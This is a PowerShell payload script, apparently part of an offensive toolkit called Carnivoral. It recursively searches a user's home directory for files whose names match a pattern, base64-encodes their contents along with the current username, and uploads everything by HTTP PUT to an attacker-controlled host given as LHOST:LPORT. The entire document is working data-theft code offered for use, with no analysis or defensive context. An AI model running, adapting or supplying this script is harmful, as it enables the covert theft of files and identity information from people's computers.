#===============================================================
# Title           :download.ps1
# Description     :Carnivoral powerShell payload to search files
# Authors         :L0stControl
# Date            :2018/04/15
# Version         :0.0.1    
#===============================================================

function Search-files
{
    $global:resultSearch = Get-ChildItem -Path "C:\Users\admin2" -Include *.* -Force -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "MATCH" } | Select -exp FullName   
}    

function Sendfiles-files ($content, $filename, $hostname)
{
    $url  = "http://LHOST:LPORT/send"
    $request = [System.Net.WebRequest]::Create($url)
    $request.ContentType = "application/x-www-form-urlencoded"
    $request.Method = "PUT"

    try
    {
        $requestStream = $request.GetRequestStream()
        $streamWriter = New-Object System.IO.StreamWriter($requestStream)
        $streamWriter.Write("hn=$hostname&fn=$filename&fc=$content")
    }
    finally
    {
        if ($null -ne $streamWriter) { $streamWriter.Dispose() }
        if ($null -ne $requestStream) { $requestStream.Dispose() }
    }
    $res = $request.GetResponse()
}

Search-files

$hostname = whoami
$hostname = [System.Text.Encoding]::UTF8.GetBytes($hostname)
$hostname = [Convert]::ToBase64String($hostname)

Foreach ($f in $global:resultSearch)
{
  $FileContent = [System.IO.File]::ReadAllBytes($f)
  $FileContentBase64 = [System.Convert]::ToBase64String($FileContent);
  # Encoding filename
  $f = [System.Text.Encoding]::UTF8.GetBytes($f)
  $f = [Convert]::ToBase64String($f)
  # Send files
  Sendfiles-files $FileContentBase64 $f $hostname
  sleep 0.5
}



